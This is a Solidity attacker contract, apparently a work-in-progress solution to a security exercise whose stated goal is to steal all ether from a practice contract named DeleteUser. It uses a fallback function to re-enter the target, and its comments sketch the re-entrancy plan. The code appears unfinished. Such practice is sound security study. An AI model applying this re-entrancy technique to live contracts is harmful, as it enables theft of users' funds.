// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./DeleteUser.sol";
import "hardhat/console.sol";

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 */
contract DeleteUserAttacker {
    DeleteUser  deleteUser;

    constructor(DeleteUser _deleteUser) {
        deleteUser = _deleteUser;
    }

    function attack() external {

        deleteUser.deposit();
        deleteUser.withdraw(1);
    }

    fallback() external payable {
        bytes32 functionSig = "";
        // deleteUser.withdraw(0);
        address(deleteUser).call(functionSig);
    }

    receive() external payable {}
}

// users [{addr: victimAddy; amount: 1 ether}, {addr: attackerAddy; amount: 0}]

// withdraw
//   get user object from storage
//   check address and get amount
//   set users[<index>] to last user in array
//   pop() array


// idea: reenter on eth xfer and deposit again --> maybe this way addr will be this contract instead of attackers
// then use this to withdraw(0)